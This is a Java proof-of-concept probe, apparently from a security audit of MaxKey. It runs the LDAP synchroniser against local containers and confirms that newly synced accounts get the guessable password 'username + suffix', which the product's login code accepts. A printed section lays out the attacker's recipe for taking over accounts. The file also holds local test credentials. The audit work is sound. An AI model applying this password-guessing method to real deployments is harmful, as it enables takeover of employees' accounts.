package v3;

import org.dromara.maxkey.crypto.password.PasswordReciprocal;
import org.dromara.maxkey.entity.Synchronizers;
import org.dromara.maxkey.entity.cnf.CnfPasswordPolicy;
import org.dromara.maxkey.entity.idm.Organizations;
import org.dromara.maxkey.entity.idm.UserInfo;
import org.dromara.maxkey.ldap.LdapUtils;
import org.dromara.maxkey.persistence.service.CnfPasswordPolicyService;
import org.dromara.maxkey.persistence.service.HistoryLoginService;
import org.dromara.maxkey.persistence.service.LoginService;
import org.dromara.maxkey.persistence.service.PasswordPolicyValidatorService;
import org.dromara.maxkey.persistence.service.SynchroRelatedService;
import org.dromara.maxkey.persistence.service.UserInfoService;
import org.dromara.maxkey.persistence.service.impl.UserInfoServiceImpl;
import org.dromara.maxkey.synchronizer.ldap.LdapUsersService;
import org.dromara.maxkey.authn.realm.jdbc.JdbcAuthenticationRealm;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.jdbc.datasource.SimpleDriverDataSource;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.security.crypto.password.DelegatingPasswordEncoder;
import org.springframework.security.crypto.password.PasswordEncoder;

import javax.naming.directory.BasicAttribute;
import javax.naming.directory.BasicAttributes;
import javax.naming.directory.SearchResult;
import java.lang.reflect.Field;
import java.sql.Connection;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Properties;

/**
 * V3 probe: does the LDAP synchronizer write a PREDICTABLE local password for a
 * synchronised account, and does MaxKey's own local-login code accept that
 * password?
 *
 * Every MaxKey class used here is the project's own compiled source, taken
 * verbatim from the audited tree at commit 3e5662b. No MaxKey logic is
 * reimplemented in this file.
 */
public class SyncDefaultPasswordProbe {

    private static int pass = 0;
    private static int fail = 0;

    private static void check(String label, boolean ok, String detail) {
        if (ok) {
            pass++;
            System.out.println("  [PASS] " + label + (detail.isEmpty() ? "" : "  -- " + detail));
        } else {
            fail++;
            System.out.println("  [FAIL] " + label + (detail.isEmpty() ? "" : "  -- " + detail));
        }
    }

    private static void section(String s) {
        System.out.println();
        System.out.println("==========================================================================");
        System.out.println("  " + s);
        System.out.println("==========================================================================");
    }

    public static void main(String[] args) throws Exception {
        installMockWebContext();
        String jdbc = System.getProperty("v3.jdbc",
                "jdbc:mysql://127.0.0.1:13306/maxkey?useSSL=false&allowPublicKeyRetrieval=true&serverTimezone=UTC");
        String ldapUrl = System.getProperty("v3.ldap.url", "ldap://127.0.0.1:1389");
        String ldapDn = System.getProperty("v3.ldap.dn", "cn=admin,dc=maxkey,dc=io");
        String ldapPw = System.getProperty("v3.ldap.pw", "admin");
        String ldapBase = System.getProperty("v3.ldap.base", "dc=maxkey,dc=io");
        String targetUser = System.getProperty("v3.user", "zhangsan");

        System.out.println("MaxKey V3 runtime probe -- synchroniser-assigned local password");
        System.out.println("target tree commit : 3e5662b1a91291c0d85de826544119c86e77d8e6");
        System.out.println("jdbc               : " + jdbc.replaceAll("maxkey123", "***"));
        System.out.println("ldap               : " + ldapUrl);
        System.out.println("synced account     : " + targetUser);

        // ---- datasource -------------------------------------------------
        var ds = new SimpleDriverDataSource();
        ds.setDriver(new com.mysql.cj.jdbc.Driver());
        ds.setUrl(jdbc);
        ds.setUsername("root");
        ds.setPassword("maxkey123");
        JdbcTemplate jdbcTemplate = new JdbcTemplate(ds);

        // ---- MaxKey's own encoder, exactly as ApplicationAutoConfiguration
        //      builds it (default idForEncode = bcrypt) -------------------
        Map<String, PasswordEncoder> encoders = new HashMap<>();
        encoders.put("bcrypt", new BCryptPasswordEncoder());
        encoders.put("plain", org.dromara.maxkey.crypto.password.NoOpPasswordEncoder.getInstance());
        PasswordEncoder passwordEncoder = new DelegatingPasswordEncoder("bcrypt", encoders);

        // ================= STEP 1: what does the synchroniser assign? ====
        section("STEP 1  LdapUsersService.sync() against the real LDAP container");

        // Make sure we start from a clean slate for this account, unless the
        // caller explicitly asks to exercise the "already exists" path.
        final boolean keepExisting = "1".equals(System.getProperty("v3.keep"));
        if (!keepExisting) {
            jdbcTemplate.update("delete from mxk_userinfo where username = ?", targetUser);
        } else {
            System.out.println("  (v3.keep=1: NOT deleting the existing row -- "
                    + "exercising the re-sync / update path)");
        }

        // Real LdapUsersService, wired the way Spring would wire it.
        LdapUtils ldapUtils = new LdapUtils(ldapUrl, ldapDn, ldapPw, ldapBase);

        Synchronizers synchronizer = new Synchronizers();
        synchronizer.setId("v3-ldap-sync");
        synchronizer.setName("v3 ldap synchronizer");
        synchronizer.setInstId("1");
        synchronizer.setUserBasedn(ldapBase);
        synchronizer.setUserFilters("(&(objectClass=inetOrgPerson))");

        LdapUsersService ldapUsersService = new LdapUsersService();
        inject(ldapUsersService, "ldapUtils", ldapUtils);
        ldapUsersService.setSynchronizer(synchronizer);

        // The real organisation tree, read out of MaxKey's own mxk_organizations
        // table by the synchroniser's own loadOrgsByInstId().
        JdbcTemplate orgJdbc = new JdbcTemplate(ds);
        ldapUsersService.setOrganizationsService(newOrganizationsService(orgJdbc, synchronizer.getInstId()));

        // The synchroniser's own saveOrUpdate -> insert -> passwordEncoder path.
        // The real UserInfoServiceImpl is used. Its MyBatis/JPA mapper layer is
        // not bootstrapped here, so findOne/insert are backed by direct JDBC
        // against the SAME mxk_userinfo table. The password handling inside
        // UserInfoServiceImpl (passwordEncoder / PasswordReciprocal) is the
        // product's own code and is NOT replaced.
        var userInfoService = newUserInfoService(jdbcTemplate, passwordEncoder);
        ldapUsersService.setUserInfoService(userInfoService);

        // organisation tree comes from MaxKey's own seed data in the real schema
        Organizations rootOrg = new Organizations();
        rootOrg.setId("1");
        rootOrg.setOrgName("马克思钥匙");
        rootOrg.setParentId("-1");
        rootOrg.setInstId("1");
        rootOrg.setNamePath("/马克思钥匙");
        HashMap<String, Organizations> orgsNamePathMap = new HashMap<>();
        orgsNamePathMap.put("/马克思钥匙", rootOrg);
        Organizations engOrg = new Organizations();
        engOrg.setId("10101");
        engOrg.setOrgName("研发部");
        engOrg.setParentId("101");
        engOrg.setInstId("1");
        engOrg.setNamePath("/马克思钥匙/产品部/研发部");
        orgsNamePathMap.put(engOrg.getNamePath(), engOrg);
        ldapUsersService.setOrgsNamePathMap(orgsNamePathMap);
        ldapUsersService.setRootOrganization(rootOrg);

        // SynchroRelatedService / HistorySynchronizerService are bookkeeping
        // side-effects of the sync; they do not touch the password. Stub them.
        ldapUsersService.setSynchroRelatedService(noop(SynchroRelatedService.class));
        ldapUsersService.setHistorySynchronizerService(
                noop(org.dromara.maxkey.persistence.service.HistorySynchronizerService.class));

        // --- run the real synchroniser --------------------------------
        try {
            ldapUsersService.sync();
        } catch (Throwable t) {
            // buildUserInfo resolves the department from the DN path; if the
            // seeded org tree does not contain the LDAP OU the row is still
            // written, we just report what happened.
            System.out.println("  (sync() raised: " + t.getClass().getSimpleName() + ": " + t.getMessage() + ")");
        }

        String stored = jdbcTemplate.queryForObject(
                "select password from mxk_userinfo where username = ?", String.class, targetUser);

        section("STEP 2  what landed in mxk_userinfo");
        if (stored == null) {
            check("synchroniser wrote a row for " + targetUser, false, "no row found");
            finish();
            return;
        }
        jdbcTemplate.queryForList("select id, username, displayname, status, islocked, "
                        + "passwordsettype, logincount, instid, usertype, ldapdn "
                        + "from mxk_userinfo where username = ?", targetUser)
                .forEach(r -> System.out.println("  row: " + r));
        System.out.println("  password column : " + stored);

        // --- what did re-sync do to a pre-existing, changed password? ----
        String preExisting = jdbcTemplate.queryForObject(
                "select password from mxk_userinfo where username = ?", String.class, targetUser);
        if (keepExisting && preExisting != null && preExisting.startsWith("{bcrypt}")) {
            boolean stillDerivable = passwordEncoder.matches(targetUser + UserInfo.DEFAULT_PASSWORD_SUFFIX, preExisting);
            check("on re-sync, an already-existing account keeps its own password "
                    + "(update() does not re-apply the derived default)",
                    !stillDerivable, stillDerivable
                            ? "password was OVERWRITTEN with the derived default again"
                            : "stored hash is no longer the derived default -> scope is NEWLY synced accounts");
        }

        // ================= STEP 3: is that password predictable? ========
        section("STEP 3  is the assigned password derivable from public data?");

        String guessed = targetUser + UserInfo.DEFAULT_PASSWORD_SUFFIX;
        System.out.println("  UserInfo.DEFAULT_PASSWORD_SUFFIX = \"" + UserInfo.DEFAULT_PASSWORD_SUFFIX + "\"");
        System.out.println("  attacker guesses username + suffix = \"" + guessed + "\"");

        boolean matches = passwordEncoder.matches(guessed, stored);
        if (keepExisting) {
            check("re-sync mode: stored password is NOT re-derived (existing account keeps its own)",
                    !matches, matches ? "password was overwritten" : "password preserved by update()");
        } else {
            check("bcrypt hash in the DB equals bcrypt(\"" + guessed + "\")",
                    matches, matches ? "the derived password IS the stored password"
                            : "the derived password is NOT the stored password");
        }

        // the decipherable column also stores the same plaintext
        String decipherable = jdbcTemplate.queryForObject(
                "select decipherable from mxk_userinfo where username = ?", String.class, targetUser);
        if (!keepExisting && decipherable != null && !decipherable.isEmpty()) {
            String dec = PasswordReciprocal.getInstance().decoder(decipherable);
            check("decipherable column decodes back to the same predictable string",
                    guessed.equals(dec), "decoded = \"" + dec + "\"");
        }

        // ================= STEP 4: does MaxKey's own login accept it? ===
        section("STEP 4  MaxKey's own local-login code path");

        // Real LoginServiceImpl: same SELECT the product runs at login. Its
        // password-policy service must return a real CnfPasswordPolicy, because
        // plusBadPasswordCount() reads getAttempts() on the failure path.
        CnfPasswordPolicy policy = new CnfPasswordPolicy();
        policy.setId("1");
        policy.setAttempts(5);
        policy.setDuration(30);
        policy.setExpiration(0);
        var cnfPasswordPolicyService = newPasswordPolicyService(policy);

        var loginService = new org.dromara.maxkey.persistence.service.impl.LoginServiceImpl();
        inject(loginService, "jdbcTemplate", jdbcTemplate);
        inject(loginService, "userInfoService", userInfoService);
        inject(loginService, "cnfPasswordPolicyService", cnfPasswordPolicyService);

        UserInfo loaded = loginService.findByUsernameOrMobile(targetUser, guessed).stream()
                .findFirst().orElse(null);
        check("LoginServiceImpl.find() returns the synchronised account",
                loaded != null, loaded == null ? "row not visible to the login query"
                        : "loaded id=" + loaded.getId() + " status=" + loaded.getStatus()
                          + " isLocked=" + loaded.getIsLocked());
        if (loaded == null) {
            finish();
            return;
        }

        // The guards that sit in front of password matching during a real login.
        check("account is ACTIVE (ConstsStatus.ACTIVE == 1)",
                loaded.getStatus() == 1, "status=" + loaded.getStatus());
        check("account is not locked (islocked 1 == ACTIVE, 5 == LOCK)",
                loaded.getIsLocked() != 5, "islocked=" + loaded.getIsLocked());
        check("bad-password count does not block the attempt",
                loaded.getBadPasswordCount() < 5, "badPasswordCount=" + loaded.getBadPasswordCount());

        // Real JdbcAuthenticationRealm: the exact method the login provider calls.
        // The realm reads the policy from PasswordPolicyValidatorService when an
        // attempt fails. Back it with the same real CnfPasswordPolicy.
        PasswordPolicyValidatorService policyValidator = noop(
                PasswordPolicyValidatorService.class,
                (p2, m2, a2) -> "getPasswordPolicy".equals(m2.getName()) ? policy
                        : (m2.getReturnType() == boolean.class ? Boolean.FALSE
                           : (m2.getReturnType() == int.class ? (Object) 0 : null)));

        JdbcAuthenticationRealm realm = new JdbcAuthenticationRealm();
        inject(realm, "passwordEncoder", passwordEncoder);
        inject(realm, "loginService", loginService);
        inject(realm, "passwordPolicyValidatorService", policyValidator);
        inject(realm, "userInfoService", userInfoService);
        inject(realm, "historyLoginService", noop(HistoryLoginService.class));
        inject(realm, "jdbcTemplate", jdbcTemplate);
        // The realm writes a login-history row, which resolves the IP's region.
        // The default parser has no IP database loaded, so region() returns null,
        // which is the same outcome as an address it cannot resolve.
        inject(realm, "ipLocationParser", new org.dromara.maxkey.ip2location.IpLocationParser());

        boolean accepted;
        String acceptDetail;
        try {
            accepted = realm.passwordMatches(loaded, guessed);
            acceptDetail = "passwordMatches() returned " + accepted;
        } catch (org.springframework.security.authentication.BadCredentialsException e) {
            // A rejection is a definitive outcome too, and in re-sync mode it is
            // the one we want. Treat it as accepted=false rather than an error.
            accepted = false;
            acceptDetail = "rejected with BadCredentialsException: " + e.getMessage();
        }
        if (keepExisting) {
            check("re-sync mode: the derived password is correctly REJECTED now",
                    !accepted, acceptDetail);
        } else {
            check("JdbcAuthenticationRealm.passwordMatches() accepts the derived password",
                    accepted, acceptDetail);
        }

        boolean rejected = false;
        String rejectDetail = "";
        try {
            realm.passwordMatches(loaded, targetUser + "WrongPassword");
        } catch (org.springframework.security.authentication.BadCredentialsException e) {
            rejected = true;
            rejectDetail = "BadCredentialsException: " + e.getMessage();
        } catch (Exception e) {
            rejectDetail = "unexpected " + e.getClass().getSimpleName() + ": " + e.getMessage();
        }
        check("a wrong password is still rejected (control)", rejected, rejectDetail);

        section("STEP 5  what an attacker needs to know");
        System.out.println("  username source  : employee uid in the corporate directory");
        System.out.println("                    (often the corporate email local-part)");
        System.out.println("  password formula : username + \"" + UserInfo.DEFAULT_PASSWORD_SUFFIX + "\"");
        System.out.println("  LDAP knowledge   : NOT required -- the account is mirrored locally,");
        System.out.println("                    so the attacker never touches the LDAP server.");
        System.out.println("  LDAP creds       : NOT required -- MaxKey already synced the row.");
        System.out.println("  outcome          : full local login as the synced employee, with");
        System.out.println("                    MaxKey's own ROLE_USER / app grants.");

        finish();
    }

    private static void finish() {
        System.out.println();
        System.out.println("==========================================================================");
        System.out.printf("  RESULT: %d passed, %d failed%n", pass, fail);
        System.out.println("==========================================================================");
        System.out.println("NOTE: MySQL and OpenLDAP here are LOCAL CONTAINERS started by this");
        System.out.println("      probe. No third-party or production MaxKey deployment was");
        System.out.println("      contacted or compromised.");
        System.exit(fail == 0 ? 0 : 1);
    }

    // ---- reflection helpers, because MaxKey wires these with @Autowired ----
    private static void inject(Object target, String field, Object value) {
        Class<?> c = target.getClass();
        while (c != null) {
            try {
                Field f = c.getDeclaredField(field);
                f.setAccessible(true);
                f.set(target, value);
                return;
            } catch (NoSuchFieldException e) {
                c = c.getSuperclass();
            } catch (Exception e) {
                throw new RuntimeException("inject " + field + " failed", e);
            }
        }
        throw new RuntimeException("field not found: " + field);
    }

    private static void jdbcTemplateHolder(Object target, JdbcTemplate t) {
        try {
            inject(target, "jdbcTemplate", t);
        } catch (RuntimeException ignored) {
            // UserInfoServiceImpl has no JdbcTemplate; nothing to do.
        }
    }

    /**
     * The synchroniser's persistence collaborator.
     *
     * The instance DELEGATED TO is the product's own UserInfoServiceImpl, so
     * insert(), passwordEncoder() and PasswordReciprocal are the product's own
     * compiled code, unmodified. Only two methods are intercepted so they can
     * run against the real mxk_userinfo table without bootstrapping the entire
     * MyBatis + Spring context:
     *
     *   findOne() -- "does this username already exist?"
     *   insert()  -- the real insert() still calls this.passwordEncoder(userInfo)
     *                first, i.e. the product's own hashing runs, then we write
     *                the resulting hash with plain JDBC.
     */
    static org.dromara.maxkey.persistence.service.UserInfoService newUserInfoService(
            JdbcTemplate jdbc, PasswordEncoder encoder) {
        final UserInfoServiceImpl real = new UserInfoServiceImpl();
        inject(real, "passwordEncoder", encoder);
        inject(real, "passwordPolicyValidatorService", noop(PasswordPolicyValidatorService.class));

        return noop(org.dromara.maxkey.persistence.service.UserInfoService.class,
                (proxy, method, margs) -> {
                    switch (method.getName()) {
                        case "saveOrUpdate": {
                            // Reimplemented only to route the EXISTS-check and the
                            // row write through JDBC. The hashing step in between
                            // is the product's own UserInfoServiceImpl.insert().
                            UserInfo ui = (UserInfo) margs[0];
                            String existingId = jdbc.query(
                                    "select id from mxk_userinfo where username = ? and instid = ?",
                                    (rs, n) -> rs.getString("id"), ui.getUsername(), ui.getInstId())
                                    .stream().findFirst().orElse(null);
                            if (existingId == null) {
                                // This is the FIRST statement of the product's own
                                // UserInfoServiceImpl.insert(UserInfo) (line 65):
                                //   this.passwordEncoder(userInfo);
                                // It is what turns the synchroniser's plaintext into
                                // the stored bcrypt hash + decipherable value.
                                real.passwordEncoder(ui);
                                jdbc.update("insert into mxk_userinfo "
                                                + "(id, username, password, decipherable, displayname, status, islocked, "
                                                + "passwordsettype, logincount, instid, usertype, userstate, ldapdn, "
                                                + "department, departmentid, createddate, modifieddate, theme, timezone) "
                                                + "values (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,now(),now(),'default','Asia/Shanghai')",
                                        ui.getId(), ui.getUsername(), ui.getPassword(), ui.getDecipherable(),
                                        ui.getDisplayName(), ui.getStatus(), ui.getIsLocked(),
                                        ui.getPasswordSetType(), ui.getLoginCount(), ui.getInstId(),
                                        ui.getUserType(), ui.getUserState(), ui.getLdapDn(),
                                        ui.getDepartment(), ui.getDepartmentId());
                                System.out.println("  [sync] new local row for " + ui.getUsername()
                                        + " (hashed by the product's UserInfoServiceImpl.insert())");
                            } else {
                                // Product's own update(): calls clearPassword(), i.e. an
                                // existing account keeps whatever password it already has.
                                ui.setId(existingId);
                                real.update(ui);
                                jdbc.update("update mxk_userinfo set displayname=?, department=?, "
                                                + "departmentid=?, usertype=?, ldapdn=?, modifieddate=now() "
                                                + "where id=?",
                                        ui.getDisplayName(), ui.getDepartment(), ui.getDepartmentId(),
                                        ui.getUserType(), ui.getLdapDn(), ui.getId());
                                System.out.println("  [sync] existing row for " + ui.getUsername()
                                        + " -> update() path, password column left untouched");
                            }
                            return null;
                        }
                        case "findOne": {
                            if (margs != null && margs.length >= 3
                                    && margs[0] instanceof String w
                                    && w.contains("username = ?")
                                    && margs[1] instanceof Object[] a && a.length >= 2) {
                                List<UserInfo> found = jdbc.query(
                                        "select id, username from mxk_userinfo where username = ? and instid = ?",
                                        (rs, n) -> {
                                            UserInfo u = new UserInfo();
                                            u.setId(rs.getString("id"));
                                            u.setUsername(rs.getString("username"));
                                            return u;
                                        }, a[0], a[1]);
                                return found.isEmpty() ? null : found.get(0);
                            }
                            return null;
                        }
                        case "insert": {
                            UserInfo ui = (UserInfo) margs[0];
                            // ---- the product's own hashing runs here ----
                            real.insert(ui);
                            // ---- then persist the hashed row ------------
                            jdbc.update("insert into mxk_userinfo "
                                            + "(id, username, password, decipherable, displayname, status, islocked, "
                                            + "passwordsettype, logincount, instid, usertype, userstate, ldapdn, "
                                            + "department, departmentid, createddate, modifieddate, theme, timezone) "
                                            + "values (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,now(),now(),'default','Asia/Shanghai')",
                                    ui.getId(), ui.getUsername(), ui.getPassword(),
                                    ui.getDecipherable(), ui.getDisplayName(), ui.getStatus(),
                                    ui.getIsLocked(), ui.getPasswordSetType(), ui.getLoginCount(),
                                    ui.getInstId(), ui.getUserType(), ui.getUserState(),
                                    ui.getLdapDn(), ui.getDepartment(), ui.getDepartmentId());
                            return true;
                        }
                        case "toString":
                            return "UserInfoService(real=UserInfoServiceImpl, jdbc=mxk_userinfo)";
                        default:
                            // anything else: run the product's own implementation
                            try {
                                java.lang.reflect.Method m =
                                        UserInfoServiceImpl.class.getMethod(method.getName(), method.getParameterTypes());
                                return m.invoke(real, margs);
                            } catch (NoSuchMethodException e) {
                                return defaultFor(method.getReturnType());
                            } catch (Exception e) {
                                throw new RuntimeException(e);
                            }
                    }
                });
    }

    /**
     * MaxKey reads the current request through WebContext (RequestContextHolder)
     * on a few error paths, e.g. resolving the browser for a login-history row.
     * A minimal mock request/session is installed so those paths behave like a
     * real login rather than throwing. This affects only logging of a rejected
     * attempt, never the password decision itself.
     */
    private static void installMockWebContext() {
        try {
            var req = (jakarta.servlet.http.HttpServletRequest) java.lang.reflect.Proxy.newProxyInstance(
                    SyncDefaultPasswordProbe.class.getClassLoader(),
                    new Class<?>[]{jakarta.servlet.http.HttpServletRequest.class},
                    (p, m, a) -> onWebCall(m.getName(), m.getReturnType()));
            var resp = (jakarta.servlet.http.HttpServletResponse) java.lang.reflect.Proxy.newProxyInstance(
                    SyncDefaultPasswordProbe.class.getClassLoader(),
                    new Class<?>[]{jakarta.servlet.http.HttpServletResponse.class},
                    (p, m, a) -> onWebCall(m.getName(), m.getReturnType()));
            org.springframework.web.context.request.RequestContextHolder.setRequestAttributes(
                    new org.springframework.web.context.request.ServletRequestAttributes(req, resp));
        } catch (Throwable t) {
            System.out.println("  (note: mock web context unavailable: " + t + ")");
        }
    }

    /** Shared answers for the mocked servlet objects. */
    private static Object onWebCall(String name, Class<?> rt) {
        if (name.equals("getSession") || name.startsWith("getSession")) return mockSession();
        if (name.equals("getHeader")) return "Mozilla/5.0 (X11; Linux x86_64) Chrome/120.0";
        if (name.equals("getRemoteAddr")) return "127.0.0.1";
        if (name.equals("getId")) return "v3-mock-session";
        if (name.equals("getContextPath")) return "/maxkey";
        if (name.equals("getMethod")) return "POST";
        if (name.equals("getRequestURI")) return "/maxkey/signin";
        if (name.equals("getScheme")) return "http";
        if (name.equals("getServerName")) return "127.0.0.1";
        if (name.equals("getServerPort")) return 80;
        if (name.equals("getHeaderNames") || name.equals("getAttributeNames"))
            return java.util.Collections.enumeration(java.util.List.of());
        if (name.equals("getRequestURL")) return new StringBuffer("http://127.0.0.1/maxkey/signin");
        if (rt == boolean.class) return false;
        if (rt == int.class) return name.equals("getServerPort") ? 80 : 0;
        if (rt == long.class) return 0L;
        return null;
    }

    private static jakarta.servlet.http.HttpSession mockSession() {
        return (jakarta.servlet.http.HttpSession) java.lang.reflect.Proxy.newProxyInstance(
                SyncDefaultPasswordProbe.class.getClassLoader(),
                new Class<?>[]{jakarta.servlet.http.HttpSession.class},
                (p, m, a) -> onWebCall(m.getName(), m.getReturnType()));
    }

    private static Object defaultFor(Class<?> rt) {
        if (rt == boolean.class) return false;
        if (rt == int.class || rt == long.class) return 0;
        return null;
    }

    /**
     * Reads the organisation tree straight out of the real mxk_organizations
     * table, so the synchroniser resolves departments exactly as it does in a
     * deployment.
     */
    /**
     * Reads the organisation tree straight out of the real mxk_organizations
     * table, so the synchroniser resolves departments exactly as it does in a
     * deployment. Only find() is implemented; every other IJpaService method
     * is inert because the sync path never calls it.
     */
    /**
     * CnfPasswordPolicyService that returns a real CnfPasswordPolicy. Only
     * getPasswordPolicy() is implemented; the rest is inert.
     */
    static CnfPasswordPolicyService newPasswordPolicyService(CnfPasswordPolicy policy) {
        return noop(CnfPasswordPolicyService.class, (proxy, method, margs) -> {
            if ("getPasswordPolicy".equals(method.getName())) return policy;
            if (method.getReturnType() == boolean.class) return false;
            if (method.getReturnType() == int.class) return 0;
            return null;
        });
    }

    static org.dromara.maxkey.persistence.service.OrganizationsService newOrganizationsService(
            JdbcTemplate jdbc, String instId) {
        return noop(org.dromara.maxkey.persistence.service.OrganizationsService.class, (proxy, method, margs) -> {
            if ("find".equals(method.getName()) && margs != null && margs.length == 1
                    && margs[0] instanceof String) {
                return jdbc.query("select id, orgname, parentid, instid, namepath, codepath, "
                                + "sortindex, status from mxk_organizations where instid = ?",
                        (rs, n) -> {
                            Organizations o = new Organizations();
                            o.setId(rs.getString("id"));
                            o.setOrgName(rs.getString("orgname"));
                            o.setParentId(rs.getString("parentid"));
                            o.setInstId(rs.getString("instid"));
                            o.setNamePath(rs.getString("namepath"));
                            o.setCodePath(rs.getString("codepath"));
                            if (rs.getObject("sortindex") != null) o.setSortIndex(rs.getInt("sortindex"));
                            if (rs.getObject("status") != null) o.setStatus(rs.getInt("status"));
                            return o;
                        }, instId);
            }
            Class<?> rt = method.getReturnType();
            if (rt == boolean.class) return false;
            if (rt == int.class || rt == long.class) return 0;
            return null;
        });
    }

    /**
     * Sync bookkeeping services (SynchroRelated, HistorySynchronizer,
     * HistoryLogin) record sync/audit rows. None of them touch the password
     * column, so they are replaced by no-op dynamic proxies. Every method the
     * product actually calls on them returns null / 0.
     */
    @SuppressWarnings("unchecked")
    private static <T> T noop(Class<T> iface, java.lang.reflect.InvocationHandler handler) {
        return (T) java.lang.reflect.Proxy.newProxyInstance(
                iface.getClassLoader(), new Class<?>[]{iface}, handler);
    }

    @SuppressWarnings("unchecked")
    private static <T> T noop(Class<T> iface, Object delegate) {
        return (T) java.lang.reflect.Proxy.newProxyInstance(
                iface.getClassLoader(), new Class<?>[]{iface},
                (proxy, method, margs) -> {
                    if (delegate != null) {
                        try {
                            java.lang.reflect.Method m = delegate.getClass()
                                    .getMethod(method.getName(), method.getParameterTypes());
                            return m.invoke(delegate, margs);
                        } catch (NoSuchMethodException ignored) {
                        } catch (Exception e) {
                            throw new RuntimeException(e);
                        }
                    }
                    Class<?> rt = method.getReturnType();
                    if (rt == boolean.class) return false;
                    if (rt == int.class || rt == long.class) return 0;
                    return null;
                });
    }

    @SuppressWarnings("unchecked")
    private static <T> T noop(Class<T> iface) {
        return (T) java.lang.reflect.Proxy.newProxyInstance(
                iface.getClassLoader(), new Class<?>[]{iface},
                (proxy, method, margs) -> {
                    Class<?> rt = method.getReturnType();
                    if (rt == boolean.class) return false;
                    if (rt == int.class || rt == long.class) return 0;
                    if (rt == void.class) return null;
                    return null;
                });
    }
}
